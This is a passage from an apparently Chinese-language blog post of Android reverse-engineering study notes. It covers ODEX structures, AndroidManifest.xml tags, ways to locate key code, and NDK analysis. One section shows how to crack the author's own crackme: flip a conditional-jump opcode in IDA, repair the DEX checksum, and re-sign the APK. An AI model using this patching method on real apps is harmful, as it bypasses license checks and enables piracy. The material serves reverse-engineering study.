u4    flags;<span class="comment">//标志</span></span><br><span class="line">    u4    checksum;<span class="comment">//依赖库与辅助数据的校验和</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li>magic：标识一个有效的ODEX文件，值为64 65 79 0A 30 33 36 00。</li><li>dexOffset：dex文件头的偏移，总为0x28，也就是说odex文件头大小为0x28。</li><li>flags：DexoptFlags中的常量，标识了Dalvik虚拟机加载ODEX时的优化与验证选项。</li><li>checksum：ODEX文件的校验和，标识了ODEX是否有效。</li></ul><h4 id="4-3-2-2-依赖库"><a href="#4-3-2-2-依赖库" class="headerlink" title="4.3.2.2 依赖库"></a>4.3.2.2 依赖库</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Dependences</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    u4    modWhen;<span class="comment">//时间戳</span></span><br><span class="line">    u4    crc;<span class="comment">//校验</span></span><br><span class="line">    u4    DALVIK_VM_BUILD;<span class="comment">//Dalvik虚拟机版本号</span></span><br><span class="line">    u4    numDeps;<span class="comment">//依赖库个数</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        u4    len;<span class="comment">//name字符串的长度</span></span><br><span class="line">        u1    name[len];<span class="comment">//依赖库的名称</span></span><br><span class="line">        kSHA1DigestLen signature;<span class="comment">//SHA-1哈希值</span></span><br><span class="line">    &#125;table[numDeps];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li>modWhen：记录优化前<code>classes.dex</code>的时间戳。</li><li>crc：优化前<code>classes.dex</code>的crc校验值。</li></ul><h4 id="4-3-2-3-辅助数据"><a href="#4-3-2-3-辅助数据" class="headerlink" title="4.3.2.3 辅助数据"></a>4.3.2.3 辅助数据</h4><p>依赖库紧接着为3个Chunk块，它们被Dalvik虚拟机加载到一个称为auxillary的段中。</p><h5 id="4-3-2-3-1-ChunkDexClassLookup"><a href="#4-3-2-3-1-ChunkDexClassLookup" class="headerlink" title="4.3.2.3.1 ChunkDexClassLookup"></a>4.3.2.3.1 ChunkDexClassLookup</h5><p>数据通过<code>writeChunk()</code>函数写入，该函数中定义了1个header。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">char</span> raw[<span class="number">8</span>];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        u4    type;</span><br><span class="line">        u4    size;</span><br><span class="line">    &#125;ts;</span><br><span class="line">&#125;header;</span><br></pre></td></tr></table></figure><p>这个header结构占用了8个字节，<code>writeChunk()</code>函数在写入具体的结构时会先填充这个结构。</p><ul><li>其中的type字段为1个以kDexChunk开头的枚举常量，它的值定义如下：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    kDexChunkClassLookup= <span class="number">0x434c4b50</span>,</span><br><span class="line">    kDexChunkRegisterMaps= <span class="number">0x524d4150</span>,</span><br><span class="line">    kDexChunkEnd= <span class="number">0x41454e44</span>,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li>size则为需要填充的数据的字节数。写入kDexChunkClassLookup结构时<code>writeOptData()</code>函数向<code>writeChunk()</code>函数传递了1个DexClassLookup结构的指针，它的结构声明如下：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">DexClassLookup</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">int</span> size;</span><br><span class="line">    <span class="type">int</span> numEntries;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        u4 classDescriptorHash;</span><br><span class="line">        <span class="type">int</span> classDescriptorOffset;</span><br><span class="line">        <span class="type">int</span> classDefOffset;</span><br><span class="line">    &#125;table[<span class="number">1</span>];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>Dalvik虚拟机通过DexClassLoopup结构来检索DEX文件中所有的类，其中size字段为本结构的字节数，numEntries字段为接下来的table结构的项数，通常值为2，而table结构用来描述了类的信息，classDescriptorHash字段和classDescriptorOffset字段为类的哈希值与类的描述，classDefOffset字段指向DexClassDef结构的指针。</p><p>根据上面的分析，可以总结出ChunkDexClassLookup的结构声明如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ChunkDexClassLookup</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    Header header;</span><br><span class="line">    DexClassLookup lookup;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h5 id="4-3-2-3-2-ChunkRegisterMapPool"><a href="#4-3-2-3-2-ChunkRegisterMapPool" class="headerlink" title="4.3.2.3.2 ChunkRegisterMapPool"></a>4.3.2.3.2 ChunkRegisterMapPool</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ChunkRegisterMapool</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    Header header;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">RegisterMapClassPool</span></span></span><br><span class="line"><span class="class">        &#123;</span></span><br><span class="line">            u4 numClasses;</span><br><span class="line">            u4 classDataOffset[<span class="number">1</span>];</span><br><span class="line">        &#125;classpool;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">RegisterMapMethodPool</span></span></span><br><span class="line"><span class="class">        &#123;</span></span><br><span class="line">            u2 methodCount;</span><br><span class="line">            u4 methodData[<span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;lookup;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h5 id="4-3-2-3-3-ChunkEnd"><a href="#4-3-2-3-3-ChunkEnd" class="headerlink" title="4.3.2.3.3 ChunkEnd"></a>4.3.2.3.3 ChunkEnd</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ChunkEnd</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    Header header;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><img src="/posts/d368aa06/4.3.1.jpg" class="" title="odex文件格式"><h2 id="4-4-Anroid程序另类破解方法"><a href="#4-4-Anroid程序另类破解方法" class="headerlink" title="4.4 Anroid程序另类破解方法"></a>4.4 Anroid程序另类破解方法</h2><p>Android程序的代码都存储在DEX文件中，通过修改代码中的执行路径是否就可以达到破解的目的呢？那么如何定位程序的破解点呢？IDA Pro可以非常方便地找到程序破解点对应的文件偏移。</p><p>用到我们之前编写的crackme程序，将<code>app-debug.apk</code>解压，有3个DEX文件，可用AK查看我们编写的代码在哪个DEX文件中。我的是在<code>classes3.dex</code>中，将其载入IDA Pro。Search -&gt; Text(快捷键Alt + T)，查找失败字符串的id值，定位到相关的Smali字节码附近。</p><img src="/posts/d368aa06/4.4.1.png" class="" title="IDA分析"><p>选中关键跳那一行，去到Hex View-1视图，高亮部分就是我们选中的关键跳指令的二进制代码，为<code>39 00 0D 00</code>。第1个字节39是if-nez指令的操作码，而if-eqz指令的操作码为38，所以将39改为38即可。选中39右键 -&gt; Edit，修改为38，右键 -&gt; Apply changes。在工具栏 Edit -&gt; Patch program -&gt; Apply patches to input file即可。</p><p>APK程序安装时会调用dexopt对DEX进行验证和优化，DEX文件中DexHeader头的checksum字段标识了DEX文件的合法性，被篡改过的DEX文件在验证时计算checksum会失败，导致程序安装失败，因此，我们需要重新计算并写入checksum值。下载<a href="https://down.52pojie.cn/Tools/Android_Tools/DexFixer.zip">DexFixer</a>工具，将修改过的DEX文件载入即可。(Win 11不兼容此工具)</p><img src="/posts/d368aa06/4.4.2.png" class="" title="DexFixer修复DEX文件"><p>将修复后的DEX文件重新放回原处，删除app-debug目录中的META-INF文件夹，压缩成ZIP文件，改后缀名为<code>.apk</code>，使用AK的签名工具给APK文件进行签名，安装到Android设备，同样也可以成功注册。</p><img src="/posts/d368aa06/4.4.3.png" class="" title="APK签名"><h1 id="5-静态分析Android程序"><a href="#5-静态分析Android程序" class="headerlink" title="5. 静态分析Android程序"></a>5. 静态分析Android程序</h1><h2 id="5-1-AndroidManifest-xml"><a href="#5-1-AndroidManifest-xml" class="headerlink" title="5.1 AndroidManifest.xml"></a>5.1 AndroidManifest.xml</h2><p>每个APK文件都包含有一个AndroidManifest.xml文件，它记录着软件的一些基本信息，包括软件的报名、运行的系统版本、用到的组件等。</p><p>一个Android程序由一个或多个Activity以及其它组件组成，每个Activity都是相同级别的，不同的Activity实现不同的功能。每个Activity都是Android程序的一个显示“页面”，主要负责数据的处理及展示工作。</p><p>每个Android程序有且只有一个主Activity（隐藏程序除外，它没有主Activity），它是程序启动的第一个Activity。<code>app-debug.apk</code>的<code>AndroidManifest.xml</code>如下所示：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span> standalone=<span class="string">&quot;no&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">manifest</span> </span></span><br><span class="line"><span class="tag">          <span class="attr">xmlns:android</span>=<span class="string">&quot;http://schemas.android.com/apk/res/android&quot;</span> </span></span><br><span class="line"><span class="tag">          <span class="attr">android:compileSdkVersion</span>=<span class="string">&quot;31&quot;</span> </span></span><br><span class="line"><span class="tag">          <span class="attr">android:compileSdkVersionCodename</span>=<span class="string">&quot;12&quot;</span> </span></span><br><span class="line"><span class="tag">          <span class="attr">package</span>=<span class="string">&quot;com.example.crackme&quot;</span> </span></span><br><span class="line"><span class="tag">          <span class="attr">platformBuildVersionCode</span>=<span class="string">&quot;31&quot;</span> </span></span><br><span class="line"><span class="tag">          <span class="attr">platformBuildVersionName</span>=<span class="string">&quot;12&quot;</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">application</span> </span></span><br><span class="line"><span class="tag">                 <span class="attr">android:allowBackup</span>=<span class="string">&quot;true&quot;</span> </span></span><br><span class="line"><span class="tag">                 <span class="attr">android:appComponentFactory</span>=<span class="string">&quot;androidx.core.app.CoreComponentFactory&quot;</span> </span></span><br><span class="line"><span class="tag">                 <span class="attr">android:debuggable</span>=<span class="string">&quot;true&quot;</span> </span></span><br><span class="line"><span class="tag">                 <span class="attr">android:icon</span>=<span class="string">&quot;@mipmap/ic_launcher&quot;</span> </span></span><br><span class="line"><span class="tag">                 <span class="attr">android:label</span>=<span class="string">&quot;@string/app_name&quot;</span> </span></span><br><span class="line"><span class="tag">                 <span class="attr">android:roundIcon</span>=<span class="string">&quot;@mipmap/ic_launcher_round&quot;</span> </span></span><br><span class="line"><span class="tag">                 <span class="attr">android:supportsRtl</span>=<span class="string">&quot;true&quot;</span> </span></span><br><span class="line"><span class="tag">                 <span class="attr">android:theme</span>=<span class="string">&quot;@style/Theme.Crackme&quot;</span>&gt;</span></span><br><span class="line">        </span><br><span class="line">        <span class="tag">&lt;<span class="name">activity</span> </span></span><br><span class="line"><span class="tag">                  <span class="attr">android:exported</span>=<span class="string">&quot;true&quot;</span> </span></span><br><span class="line"><span class="tag">                  <span class="attr">android:name</span>=<span class="string">&quot;com.example.crackme.MainActivity&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.action.MAIN&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.category.LAUNCHER&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">activity</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">application</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">manifest</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="5-1-1-manifest标签"><a href="#5-1-1-manifest标签" class="headerlink" title="5.1.1 manifest标签"></a>5.1.1 manifest标签</h3><p>所有的XML文件都必须包含manifest标签，这是文件的根节点。它必须要包含application标签，并且指明<code>xmlns:android</code>和<code>package</code>属性。</p><h4 id="5-1-1-1-xmlns-android"><a href="#5-1-1-1-xmlns-android" class="headerlink" title="5.1.1.1 xmlns:android"></a>5.1.1.1 xmlns:android</h4><p>这个属性定义了Andrid命名空间，必须设置成”<a href="http://schemas.android.com/apk/res/android">http://schemas.android.com/apk/res/android</a> “，不能手动修改。</p><h4 id="5-1-1-2-package"><a href="#5-1-1-2-package" class="headerlink" title="5.1.1.2 package"></a>5.1.1.2 package</h4><p>这是一个完整的Java语言风格包名。包名由英文字母（大小写均可）、数字和下划线组成。每个独立的名字必须以字母开头。</p><p>构建APK的时候，构建系统使用这个属性来做两件事：</p><ul><li>生成<code>R.java</code>类时用这个名字作为命名空间（用于访问App的资源）。比如：package被设置成com.sample.teapot，那么生成的R类就是：com.sample.teapot.R</li><li>用来生成在manifest文件中定义的类的完整类名。比如package被设置成com.sample.teapot，并且activity元素被声明成<activity android:name=".MainActivity">，完整的类名就是com.sample.teapot.MainActivity。</li></ul><p>包名也代表着唯一的application ID，用来发布应用。但是，要注意的一点是：在APK构建过程的最后一步，package名会被build.gradle文件中的applicationId属性取代。如果这两个属性值一样，那么万事大吉，如果不一样，那就要小心了。</p><h4 id="5-1-1-3-adnroid-versionCode"><a href="#5-1-1-3-adnroid-versionCode" class="headerlink" title="5.1.1.3 adnroid:versionCode"></a>5.1.1.3 adnroid:versionCode</h4><p>内部的版本号。用来表明版本的更新。这个数字不会显示给用户。显示给用户的是android:versionName。这个数字必须是整数。不能用16进制，也就是说不接受”0x1”这种参数。</p><h4 id="5-1-1-4-android-versionName"><a href="#5-1-1-4-android-versionName" class="headerlink" title="5.1.1.4 android:versionName"></a>5.1.1.4 android:versionName</h4><p>显示给用户看的版本号。</p><h3 id="5-1-2-uses-feature标签"><a href="#5-1-2-uses-feature标签" class="headerlink" title="5.1.2 uses-feature标签"></a>5.1.2 uses-feature标签</h3><p>uses-feature标签是manifest标签里的元素，Google Play利用这个标签的值从不符合应用需要的设备上将应用过滤。</p><p>它的作用是将App所依赖的硬件或者软件条件告诉别人，说明了App的哪些功能可以随设备的变化而变化。</p><p>使用的时候要注意，必须在单独的<uses-feature>元素中指定每个功能，如果要多个功能，需要多个<uses-feture>元素。比如要求设备同时具有蓝牙和相机功能：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">uses-feature</span> <span class="attr">android:name</span>=<span class="string">&quot;android.hardware.bluetooth&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">uses-feature</span> <span class="attr">android:name</span>=<span class="string">&quot;android.hardware.camera&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure><h4 id="5-1-2-1-android-name"><a href="#5-1-2-1-android-name" class="headerlink" title="5.1.2.1 android:name"></a>5.1.2.1 android:name</h4><p>该属性以字符串形式指定了APP要用的硬件或软件功能。</p><h4 id="5-1-2-2-android-required"><a href="#5-1-2-2-android-required" class="headerlink" title="5.1.2.2 android:required"></a>5.1.2.2 android:required</h4><p>这项属性如果值为true表示需要这项功能，否则应用无法工作，如果为false表示应用在必要时会使用该功能，但是如果没有此功能应用也能工作。</p><h4 id="5-1-2-3-android-glEsVersion"><a href="#5-1-2-3-android-glEsVersion" class="headerlink" title="5.1.2.3 android:glEsVersion"></a>5.1.2.3 android:glEsVersion</h4><p>指明应用需要的Opengl ES版本。高16位表示主版本号，低16位表示次版本号。例如，如果是要3.2的版本，就是0x00030002。如果定义多个glEsVersion，应用会自动启用最高的设置。</p><h3 id="5-1-3-application标签"><a href="#5-1-3-application标签" class="headerlink" title="5.1.3 application标签"></a>5.1.3 application标签</h3><p>该标签也是manifest标签中的一个元素，描述了应用的配置。这是一个必备的元素，它包含了很多子元素来描述应用的组件，它的属性影响到所有的子组件。许多属性（例如icon、label、permission、process、taskAffinity和allowTaskReparenting）都可以设置成默认值。</p><h4 id="5-1-3-1-android-allowBackup"><a href="#5-1-3-1-android-allowBackup" class="headerlink" title="5.1.3.1 android:allowBackup"></a>5.1.3.1 android:allowBackup</h4><p>表示是否允许App加入到备份还原的结构中。如果设置成false，那么应用就不会备份还原。默认值为true。</p><h4 id="5-1-3-2-android-fullBackupContent"><a href="#5-1-3-2-android-fullBackupContent" class="headerlink" title="5.1.3.2 android:fullBackupContent"></a>5.1.3.2 android:fullBackupContent</h4><p>这个属性指向了一个XML文件，该文件中包含了在进行自动备份时的完全备份规则。这些规则定义了哪些文件需要备份。此属性是一个可选属性。默认情况下，自动备份包含了大部分App文件。</p><h4 id="5-1-3-3-android-supportsRtl"><a href="#5-1-3-3-android-supportsRtl" class="headerlink" title="5.1.3.3 android:supportsRtl"></a>5.1.3.3 android:supportsRtl</h4><p>声明App是否支持RTL（Right To  Left）布局。如果设置成true，并且targetSdkVersion被设置成17或更高。很多RTL  API会被集火，这样你的应用就可以显示RTL布局了。如果设置成false或者targetSdkVersion被设置成16或更低，RTL  API就不起作用了。该属性的默认的值是false。</p><h4 id="5-1-3-4-android-icon"><a href="#5-1-3-4-android-icon" class="headerlink" title="5.1.3.4 android:icon"></a>5.1.3.4 android:icon</h4><p>App的图标，以及每个组件的默认图标。可以在组件中自定义图标。这个属性必须设置成一个引用，指向一个可绘制的资源，这个资源必须包含图片。系统不设置默认图标。</p><h4 id="5-1-3-5-android-label"><a href="#5-1-3-5-android-label" class="headerlink" title="5.1.3.5 android:label"></a>5.1.3.5 android:label</h4><p>一个用户可读的标签，以及所有组件的默认标签。子组件可以用它们的label属性定义自己的标签，如果没有定义，那么就用这个标签。</p><p>标签必须设置成一个字符串资源的引用。这样它们就能和其他东西一样被定位，比如@string/app_name。当然，为了开发方便，你也可以定义一个原始字符串。</p><h4 id="5-1-3-6-android-theme"><a href="#5-1-3-6-android-theme" class="headerlink" title="5.1.3.6 android:theme"></a>5.1.3.6 android:theme</h4><p>该属性定义了应用使用的主题的，它是一个指向style资源的引用。各个activity也可以用自己的theme属性设置自己的主题。</p><h4 id="5-1-3-7-android-name"><a href="#5-1-3-7-android-name" class="headerlink" title="5.1.3.7 android:name"></a>5.1.3.7 android:name</h4><p>Application子类的全名。包括前面的路径。例如com.sample.teapot.TeapotApplication。当应用启动时，这个类的实例被第一个创建。这个属性是可选的，大多数APP都不需要这个属性。在没有这个属性的时候，Android会启动一个Application类的实例。</p><h3 id="5-1-4-activity标签"><a href="#5-1-4-activity标签" class="headerlink" title="5.1.4 activity标签"></a>5.1.4 activity标签</h3><p>activity标签是application标签中的一个元素，声明一个实现应用可视化界面的Activity（Activity类子类）。这是application标签中必要的子标签。所有Activity都必须由清单文件中的activity标签表示。任何未在该处声明的Activity对系统都不可见，并且永远不会被执行。</p><h4 id="5-1-4-1-android-name"><a href="#5-1-4-1-android-name" class="headerlink" title="5.1.4.1 android:name"></a>5.1.4.1 android:name</h4><p>Activity类的名称，是Activity类的子类。该属性值为完全限定类名称，例如com.sample.teapot.TeapotNativeActivity。为了方便起见，如果第一个字符是点（’.’），就需要加上manifest标签中的包名。应用一旦发布，不应更改该名称。该元素没有默认值，必须指定该名称。</p><h4 id="5-1-4-2-android-label"><a href="#5-1-4-2-android-label" class="headerlink" title="5.1.4.2 android:label"></a>5.1.4.2 android:label</h4><p>Activity标签，可以被用户读取。该标签会在Activity激活时显示在屏幕上。如果未设置，用application中的label属性。对属性的设置要求和application中一样。</p><h4 id="5-1-4-3-android-configChanges"><a href="#5-1-4-3-android-configChanges" class="headerlink" title="5.1.4.3 android:configChanges"></a>5.1.4.3 android:configChanges</h4><p>列出 Activity 将自行处理的配置更改消息。在运行时发生配置更改时，默认情况下会关闭 Activity 然后将其重新启动，但使用该属性声明配置将阻止 Activity 重新启动。 Activity 反而会保持运行状态，并且系统会调用其 onConfigurationChanged()方法。</p><p>注：应避免使用该属性，并且只应在万不得已的情况下使用。</p><p>该属性可以设置的项很多，这里列出常用的项：</p><ul><li><p>orientation<br> 屏幕方向发生了变化，比如用户旋转了设备</p></li><li><p>keyboardHidden<br> 键盘无障碍功能发生了变化，比如用户显示了硬件键盘</p></li><li><p>android:launchMode<br> 关于如何启动Activity的指令。一共有四种指令：<br> “standard”<br> “singleTop”<br> “singleTask”<br> “singleInstance”<br>默认情况下是standard。这些模式被分为两大类：</p><p>“standard”和”singleTop”是一类。该模式的Activity可以多次实例化。实例可属于任何任务，并且可以位于Activity堆栈中的任何位置。</p><p>“singleTask”和”singleInstance”是一类。该模式只能启动任务，它们始终位于Activity堆栈的根位置。此外，设备一次只能保留一个Activity实例。</p><p>设置成singleTask后，系统在新任务的根位置创建Activity并向其传送Intent。如果已经存在一个Activity实例，则系统会通过调用该实例的onNewIntent()方法向其传送Intent而不是创建一个新的Activity实例。</p></li></ul><h4 id="5-1-4-4-android-theme"><a href="#5-1-4-4-android-theme" class="headerlink" title="5.1.4.4 android:theme"></a>5.1.4.4 android:theme</h4><p>设定主题格式，与application标签中的theme属性类似。</p><h3 id="5-1-5-meta-data标签"><a href="#5-1-5-meta-data标签" class="headerlink" title="5.1.5 meta-data标签"></a>5.1.5 meta-data标签</h3><p>activity标签中的元素，指定额外的数据项，该数据项是一个name-value对，提供给其父组件。这些数据会组成一个Bundle对象，可以由PackageItemInfo.metaData字段使用。虽然可以使用多个meta-data标签，但是不推荐这么使用。如果有多个数据项要指定，推荐做法是：将多个数据项合并成一个资源，然后使用一个meta-data标签包含进去。</p><p>该标签有三个属性：</p><ul><li>android:name：数据项名称，这是一个唯一值。</li><li>android:resource：一个资源的引用。</li><li>android:value：数据项的值。</li></ul><h3 id="5-1-6-intent-filter标签"><a href="#5-1-6-intent-filter标签" class="headerlink" title="5.1.6 intent-filter标签"></a>5.1.6 intent-filter标签</h3><p>activity标签中的元素，指明这个activity可以以什么样的意图(intent)启动。</p><h3 id="5-1-7-action标签"><a href="#5-1-7-action标签" class="headerlink" title="5.1.7 action标签"></a>5.1.7 action标签</h3><p>intent-filter标签中的元素，表示activity作为一个什么动作启动，android.intent.action.MAIN表示作为主activity启动。</p><h3 id="5-1-8-category标签"><a href="#5-1-8-category标签" class="headerlink" title="5.1.8 category标签"></a>5.1.8 category标签</h3><p>intent-filter标签中的元素，这是action元素的额外类别信息，android.intent.category.LAUNCHER表示这个activity为当前应用程序优先级最高的Activity。</p><h3 id="5-1-9-总结"><a href="#5-1-9-总结" class="headerlink" title="5.1.9 总结"></a>5.1.9 总结</h3><img src="/posts/d368aa06/5.1.2.png" class="" title="总结"><p>上面是我自己总结的<code>AndroidManifest.xml</code>文件，下面是别人的更为详细的总结。</p><img src="/posts/d368aa06/5.1.3.png" class="" title="总结"><h2 id="5-2-定位关键代码的6种方法"><a href="#5-2-定位关键代码的6种方法" class="headerlink" title="5.2 定位关键代码的6种方法"></a>5.2 定位关键代码的6种方法</h2><ul><li><p>信息反馈法</p><p>运行目标程序，然后根据程序运行时给出的反馈信息作为突破口寻找关键代码。比如在2.2时破解程序就是通过“注册失败”信息来定位关键代码的。通常情况下，程序中用到的字符串会存储在<code>strings.xml</code>文件或硬编码到程序代码中。如果是前者，字符串在程序中会以id的形式访问，只需在反汇编代码中搜索字符串的id值即可找到调用代码处；如果是后者，在反汇编代码中直接搜索字符串即可。</p></li><li><p>特征函数法</p><p>这种定位代码的方法与信息反馈法类似。在信息反馈法中，无论程序给出什么样的反馈信息，终究是需要调用Android SDK中提供的相关API函数来完成的。比如弹出“注册失败”的提示信息就需要调用<code>Toast.MakeText().Show()</code>方法，在反汇编代码中直接搜索Toast应该很快就能定位到调用代码。</p></li><li><p>顺序查看法</p><p>顺序查看法是指从软件的启动代码开始，逐行向下分析，掌握软件的执行流程，这种分析方法在病毒分析时经常用到。</p></li><li><p>代码注入法</p><p>属于动态调试，它的原理是手动修改APK文件的反汇编代码，加入Log输出，配合LogCat查看程序执行到特定点时的状态数据。这种方法在解密程序数据时经常使用。</p></li><li><p>栈跟踪法</p><p>动态调试方法，它的原理是输出运行时的栈跟踪信息，然后查看栈上的函数调用序列来理解方法的执行流程。</p></li><li><p>Method Profiling</p><p>Method Profiling（方法剖析）属于动态调试，主要用于热点分析和性能优化。该功能除了可以记录每个函数占用的CPU时间之外，还能够跟踪所有的函数调用关系，并提供比栈跟踪法更详细的函数调用序列报告。</p></li></ul><h2 id="5-3-使用IDA-Pro静态分析Android程序"><a href="#5-3-使用IDA-Pro静态分析Android程序" class="headerlink" title="5.3 使用IDA Pro静态分析Android程序"></a>5.3 使用IDA Pro静态分析Android程序</h2><p>使用IDA Pro分析DEX文件与使用AK分析APK文件都是差不多的，看的都是Smali代码，而且IDA需要手动解压APK文件提取出DEX文件，修改完后还需打包签名，所以用AK不香吗？希望IDA以后能打我脸。</p><h1 id="6-Android-NDK程序"><a href="#6-Android-NDK程序" class="headerlink" title="6. Android NDK程序"></a>6. Android NDK程序</h1><h2 id="6-1-Android原生程序与Android-NDK程序的区别"><a href="#6-1-Android原生程序与Android-NDK程序的区别" class="headerlink" title="6.1 Android原生程序与Android NDK程序的区别"></a>6.1 Android原生程序与Android NDK程序的区别</h2><p>原生程序应该是Java编写的，Android NDK程序是通过JNI(Java Native Interface)提供的API函数将原生C/C++代码与Java代码进行数据交换，使得使用C/C++代码也能写出功能强大的程序，甚至将大部分的Java代码转移到C/C++代码中来。</p><p>静态分析Android NDK程序与分析传统的原生程序有些不同，传统的原生程序中只调用了原生API函数，使用IDA Pro分析它们时会被自动识别出来，因此分析的难度转移到了理解ARM指令集序列的含义上。而Android NDK程序使用了JNI接口函数，在分析它们时IDA Pro并不能识别它们，这使得分析工作变得比较艰难。</p><h2 id="6-2-分析Android-NDK程序"><a href="#6-2-分析Android-NDK程序" class="headerlink" title="6.2 分析Android NDK程序"></a>6.2 分析Android NDK程序</h2><p>如果使用C++代码来调用JNI接口函数，JNIEnv被定义成了_JNIEnv结构体，该结构体的第一个字段就是一个JNINativeInterface结构体的指针。</p><p>如果C代码调用JNI接口函数，JNIEnv则直接被定义成JNINativeInterface结构体的指针。</p><p>因此可以将JNIEnv的首地址解释成JNINativeInterface的首地址来使用，通过首地址加上索引值就能找到具体的函数。</p><h1 id="7-动态调试Android程序"><a href="#7-动态调试Android程序" class="headerlink" title="7. 动态调试Android程序"></a>7. 动态调试Android程序</h1><p>DDMS(Dalvik Debug Monitor Server，Dalvik调试监视器服务)提供了设备截屏、查看运行的线程信息、文件浏览、LogCat、Method Profiling、广播状态信息、模拟电话呼叫、接收SMS、虚拟地理坐标等功能。它的文件浏览、LogCat、Method 